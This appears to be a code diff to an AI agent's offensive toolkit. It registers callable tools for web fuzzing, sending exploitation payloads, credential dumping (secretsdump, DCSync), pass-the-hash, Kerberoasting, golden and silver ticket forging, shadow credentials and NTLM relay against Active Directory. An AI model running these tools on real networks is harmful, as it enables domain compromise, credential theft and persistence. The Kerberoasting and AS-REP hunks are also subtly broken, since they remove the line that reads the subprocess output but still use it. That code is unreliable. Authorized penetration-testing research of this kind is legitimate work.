@@ -16,6 +16,7 @@ from pathlib import Path
 from typing import Any, Dict
 
 from darwin.tools.mcp_gateway import MCPGateway, ToolResult
+from darwin.tools.paths import resolve_wordlist, tool_path_env
 
 
 def _parse_hydra_output(stdout: str) -> Dict[str, Any]:
@@ -108,6 +109,36 @@ async def _run_shell(cmd: str, timeout: int = 60) -> ToolResult:
         )
 
 
+def _normalize_header_arg(headers: str) -> str:
+    """Normalize a user-supplied header list to newline-separated ``K: v``.
+
+    Accepts pipe- or newline-separated input; ``_python_request`` consumes
+    one header per line.  Values are never split on commas, so headers whose
+    values legitimately contain commas stay intact.
+    """
+    if not headers:
+        return ""
+    lines = []
+    for chunk in str(headers).replace("\r", "\n").split("\n"):
+        for part in chunk.split("|"):
+            part = part.strip()
+            if part and ":" in part:
+                lines.append(part)
+    return "\n".join(lines)
+
+
+def normalize_fuzz_url(url: str) -> str:
+    """Ensure an ffuf URL carries the FUZZ keyword.
+
+    ffuf exits 0 while printing "Keyword FUZZ defined, but not found", so a
+    task that says "fuzz this host" without a placeholder silently produced a
+    successful-looking no-op.
+    """
+    if url and "FUZZ" not in url:
+        return url.rstrip("/") + "/FUZZ"
+    return url
+
+
 async def _python_request(
     method: str, url: str, data: str = "", headers: str = "",
     timeout: int = 10, insecure: bool = False,
@@ -145,7 +176,7 @@ req = urllib.request.Request(url, method=method, data=data.encode() if data else
 if data and method in ('POST', 'PUT', 'PATCH') and 'content-type' not in headers.lower():
     req.add_header('Content-Type', 'application/x-www-form-urlencoded')
 if headers:
-    for h in headers.strip().split('\\\\n'):
+    for h in headers.strip().split('\\n'):
         if ':' in h:
             k, v = h.split(':', 1)
             req.add_header(k.strip(), v.strip())
@@ -349,24 +380,41 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
 
     # ── Web fuzzing (ffuf) ──────────────────────────────────────
+    def _prepare_ffuf(params: dict) -> dict:
+        # ffuf aborts with "Keyword FUZZ ... not found" and still exits 0 when
+        # no placeholder is present — complete the URL instead so a planned
+        # "fuzz this host" task actually enumerates paths.
+        params["url"] = normalize_fuzz_url(str(params.get("url", "") or ""))
+        resolved = resolve_wordlist(str(params.get("wordlist", "") or ""))
+        params["wordlist"] = resolved or str(params.get("wordlist", "") or "")
+        return params
+
     gateway.register_shell_tool(
         name="ffuf_fuzz",
-        command_template="ffuf -u '{url}' -w /usr/share/dirb/wordlists/common.txt -mc 200,301,302,403 -o /dev/null 2>&1 | head -100",
+        command_template="ffuf -u '{url}' -w {wordlist} -mc 200,204,301,302,307,401,403,405 -o /dev/null 2>&1 | head -200",
         description="Fuzz web parameters or paths using ffuf",
         parameters={
             "url": {"type": "string", "description": "Target URL with FUZZ keyword"},
+            "wordlist": {"type": "string", "description": "Wordlist name or absolute path (resolved against the project wordlist directory)", "default": "common.txt"},
         },
+        prepare_params=_prepare_ffuf,
     )
 
     # ── HTTP request with custom payload ────────────────────────
     async def send_payload(
-        url: str, param: str, payload: str, method: str = "GET",
+        url: str, param: str = "", payload: str = "", method: str = "GET",
         encode_type: str = "none", body_format: str = "form",
-        insecure: bool = False,
+        headers: str = "", insecure: bool = False,
     ) -> ToolResult:
         """Send a custom payload to a target. Supports GET query string and
-        POST with form-encoded or JSON body."""
+        POST with form-encoded or JSON body.
+
+        ``param``/``payload`` may be empty: a POST whose JSON body is given
+        verbatim, or a plain non-injecting request, are both legitimate uses
+        (header-driven APIs authenticate via ``headers``)."""
         import urllib.parse, json
+
+        extra_headers = _normalize_header_arg(headers)
 
         # Apply encoding
         encoded_payload = payload
@@ -379,8 +427,12 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
         if method.upper() == "GET":
             separator = "&" if "?" in url else "?"
-            full_url = f"{url}{separator}{urllib.parse.urlencode({param: encoded_payload})}"
-            return await _python_request("GET", full_url, insecure=insecure)
+            full_url = url
+            if param:
+                full_url = f"{url}{separator}{urllib.parse.urlencode({param: encoded_payload})}"
+            return await _python_request(
+                "GET", full_url, headers=extra_headers, insecure=insecure
+            )
         elif body_format == "json":
             import json as _js
             # If payload looks like complete JSON, use it directly.
@@ -394,9 +446,12 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                     body = _js.dumps({param or "payload": encoded_payload})
             else:
                 body = _js.dumps({param or "payload": encoded_payload})
+            _hdr = "Content-Type: application/json"
+            if extra_headers:
+                _hdr = f"{_hdr}\n{extra_headers}"
             return await _python_request(
                 "POST", url, body,
-                headers="Content-Type: application/json",
+                headers=_hdr,
                 insecure=insecure,
             )
         else:
@@ -405,21 +460,27 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             # multi-parameter payload like "ak=X&sk=Y&Version=Z".
             if not param and ('=' in payload or '&' in payload):
                 return await _python_request("POST", url, encoded_payload,
+                                            headers=extra_headers or "",
                                             insecure=insecure)
             body = urllib.parse.urlencode({param: encoded_payload})
-            return await _python_request("POST", url, body, insecure=insecure)
+            return await _python_request(
+                "POST", url, body,
+                headers=extra_headers or "",
+                insecure=insecure,
+            )
 
     gateway.register(
         name="send_payload",
         func=send_payload,
-        description="Send an exploitation payload to a target. Supports GET/POST with form or JSON body. Use insecure=true for self-signed TLS.",
+        description="Send an exploitation payload to a target. Supports GET/POST with form or JSON body; pass a complete JSON string in payload for APIs that take a structured body, and use the headers parameter for header-driven auth (e.g. X-Api-Key: k|Authorization: Bearer t). param may be empty when nothing is injected into a single named parameter. Use insecure=true for self-signed TLS.",
         parameters={
             "url": {"type": "string", "description": "Target URL"},
-            "param": {"type": "string", "description": "Parameter name to inject"},
-            "payload": {"type": "string", "description": "Payload string to send"},
+            "param": {"type": "string", "description": "Parameter name to inject (optional: leave empty when the body is sent verbatim)", "default": ""},
+            "payload": {"type": "string", "description": "Payload string to send (optional)", "default": ""},
             "method": {"type": "string", "description": "HTTP method (GET/POST)"},
             "encode_type": {"type": "string", "description": "Encoding: none|url|double_url|html_entity"},
             "body_format": {"type": "string", "description": "POST body format: form or json (default form)"},
+            "headers": {"type": "string", "description": "Extra headers, pipe- or newline-separated (e.g. 'X-Api-Key: k|Authorization: Bearer t')", "default": ""},
             "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
         },
     )
@@ -2076,7 +2137,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     # ── Active Directory Tools ─────────────────────────────────────
 
-    _NXC = "/home/kianabin/Darwin/venv/bin/netexec"
+    _NXC = "netexec"
 
     gateway.register_shell_tool(
         name="netexec_enum",
@@ -2152,7 +2213,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_secretsdump",
-        command_template="python3 /home/kianabin/Darwin/venv/bin/secretsdump.py {target} 2>&1 | head -100",
+        command_template="python3 -m impacket.examples.secretsdump {target} 2>&1 | head -100",
         description="Dump SAM/LSA secrets from a target using impacket-secretsdump. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
         parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
         parser=_parse_shell_output,
@@ -2160,7 +2221,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_psexec",
-        command_template="python3 /home/kianabin/Darwin/venv/bin/psexec.py {target} 2>&1",
+        command_template="python3 -m impacket.examples.psexec {target} 2>&1",
         description="Execute commands on a remote Windows host via PsExec. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
         parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
         parser=_parse_shell_output,
@@ -2168,7 +2229,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_wmiexec",
-        command_template="python3 /home/kianabin/Darwin/venv/bin/wmiexec.py {target} 2>&1",
+        command_template="python3 -m impacket.examples.wmiexec {target} 2>&1",
         description="Execute commands via WMI on a remote Windows host. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
         parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
         parser=_parse_shell_output,
@@ -2188,16 +2249,16 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         """Kerberoasting: request TGS tickets for users with SPNs. Uses -no-pass when no password."""
         import asyncio, time
         start = time.perf_counter()
-        script = "/home/kianabin/Darwin/venv/bin/GetUserSPNs.py"
+        script = "impacket.examples.GetUserSPNs"
         if password:
             target = f"{domain}/{user}:{password}@{dc_ip}"
-            cmd = f"python3 {script} {target} -request 2>&1 | head -80"
+            cmd = f"python3 -m {script} {target} -request 2>&1 | head -80"
         else:
-            cmd = f"python3 {script} {domain}/{user or ''} -dc-ip {dc_ip} -request -no-pass 2>&1 | head -80"
+            cmd = f"python3 -m {script} {domain}/{user or ''} -dc-ip {dc_ip} -request -no-pass 2>&1 | head -80"
         try:
             proc = await asyncio.create_subprocess_shell(
-                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
+                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+                env=tool_path_env())
             stdout_s = stdout.decode("utf-8", errors="replace")
             stderr_s = stderr.decode("utf-8", errors="replace")
             elapsed = (time.perf_counter() - start) * 1000
@@ -2229,16 +2290,16 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         """AS-REP Roasting: request TGT for users without Kerberos pre-authentication. Uses -no-pass when no password."""
         import asyncio, time
         start = time.perf_counter()
-        script = "/home/kianabin/Darwin/venv/bin/GetNPUsers.py"
+        script = "impacket.examples.GetNPUsers"
         if password:
             target = f"{domain}/{user}:{password}@{dc_ip}"
-            cmd = f"python3 {script} {target} -request -format hashcat 2>&1 | head -80"
+            cmd = f"python3 -m {script} {target} -request -format hashcat 2>&1 | head -80"
         else:
-            cmd = f"python3 {script} {domain}/ -dc-ip {dc_ip} -request -format hashcat -no-pass 2>&1 | head -80"
+            cmd = f"python3 -m {script} {domain}/ -dc-ip {dc_ip} -request -format hashcat -no-pass 2>&1 | head -80"
         try:
             proc = await asyncio.create_subprocess_shell(
-                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
+                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+                env=tool_path_env())
             stdout_s = stdout.decode("utf-8", errors="replace")
             stderr_s = stderr.decode("utf-8", errors="replace")
             elapsed = (time.perf_counter() - start) * 1000
@@ -2266,7 +2327,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_secretsdump_dcsync",
-        command_template="python3 /home/kianabin/Darwin/venv/bin/secretsdump.py -just-dc {target} 2>&1 | head -100",
+        command_template="python3 -m impacket.examples.secretsdump -just-dc {target} 2>&1 | head -100",
         description="DCSync: replicate domain credentials from a Domain Controller. Requires Replication-Get-Changes-All privilege. Target format: DOMAIN/USER:PASSWORD@DC_IP",
         parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP"}},
         parser=_parse_shell_output,
@@ -2274,7 +2335,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_pth",
-        command_template="python3 /home/kianabin/Darwin/venv/bin/psexec.py -hashes :{nthash} {target} 2>&1",
+        command_template="python3 -m impacket.examples.psexec -hashes :{nthash} {target} 2>&1",
         description="Pass-the-Hash: execute commands on a remote Windows host using an NTLM hash instead of a password. Target format: DOMAIN/USER@TARGET_IP. Requires the user's NTLM hash (from secretsdump or DCSync).",
         parameters={
             "nthash": {"type": "string", "description": "NTLM hash (NT part, 32 hex chars)"},
@@ -2285,7 +2346,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_ticketer",
-        command_template="python3 /home/kianabin/Darwin/venv/bin/ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {user} 2>&1 | head -50",
+        command_template="python3 -m impacket.examples.ticketer -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {user} 2>&1 | head -50",
         description="Golden Ticket: forge a Kerberos TGT using the KRBTGT account hash. Grants domain-wide persistence and privilege escalation. Requires KRBTGT NTLM hash and domain SID.",
         parameters={
             "krbtgt_hash": {"type": "string", "description": "KRBTGT account NTLM hash"},
@@ -2301,7 +2362,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     gateway.register_shell_tool(
         name="impacket_silver_ticket",
-        command_template="python3 /home/kianabin/Darwin/venv/bin/ticketer.py -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {service_spn} {user} 2>&1 | head -50",
+        command_template="python3 -m impacket.examples.ticketer -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {service_spn} {user} 2>&1 | head -50",
         description="Silver Ticket: forge a Kerberos TGS (service ticket) using the target service account's NTLM hash. Grants access to a specific service (e.g. 'cifs/dc.domain.com', 'http/web.domain.com') without domain admin privileges. Requires the service account's NTLM hash and domain SID.",
         parameters={
             "service_hash": {"type": "string", "description": "Target service account NTLM hash (32 hex chars)"},
@@ -2318,7 +2379,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     gateway.register_shell_tool(
         name="impacket_getST",
-        command_template="python3 /home/kianabin/Darwin/venv/bin/getST.py -spn {spn} -impersonate {target_user} {target} 2>&1 | head -80",
+        command_template="python3 -m impacket.examples.getST -spn {spn} -impersonate {target_user} {target} 2>&1 | head -80",
         description="S4U2Self/S4U2Proxy Constrained Delegation: request a service ticket on behalf of another user via Kerberos constrained delegation. Use when a service account has msDS-AllowedToDelegateTo configured. Target format: DOMAIN/USER:PASSWORD@DC_IP.",
         parameters={
             "spn": {"type": "string", "description": "Target service SPN (e.g. 'ldap/dc01.domain.local', 'cifs/dc01.domain.local')"},
@@ -2802,7 +2863,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     gateway.register_shell_tool(
         name="pywhisker",
-        command_template="/home/kianabin/Darwin/venv/bin/pywhisker -d {domain} -u {user} -p '{password}' -t {target} --action add -D {target_user} 2>&1 | head -50",
+        command_template="pywhisker -d {domain} -u {user} -p '{password}' -t {target} --action add -D {target_user} 2>&1 | head -50",
         description="Shadow Credentials attack (AD-18): add KeyCredentialLink to a target user in Active Directory to take over the account. Uses PKINIT to authenticate with the added key. Requires an account with GenericWrite/GenericAll over the target user.",
         parameters={
             "domain": {"type": "string", "description": "Fully qualified domain name"},
@@ -4013,7 +4074,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_ntlmrelayx",
-        command_template="timeout 30 python3 /home/kianabin/Darwin/venv/bin/ntlmrelayx.py -t {target_url} {extra_args} 2>&1",
+        command_template="timeout 30 python3 -m impacket.examples.ntlmrelayx -t {target_url} {extra_args} 2>&1",
         description="Run NTLM relay attack via impacket-ntlmrelayx. Use for AD CS ESC8 (AD-06, AD-Chain-2/3/6) — relay captured NTLM authentication to AD CS HTTP endpoint to obtain certificates. Target URL should point to the AD CS certsrv endpoint (e.g. 'http://dc/certsrv/certfnsh.asp'). Add '-smb2support' for SMBv2 targets.",
         parameters={
             "target_url": {"type": "string", "description": "Target URL to relay NTLM auth to (e.g. AD CS HTTP endpoint)"},
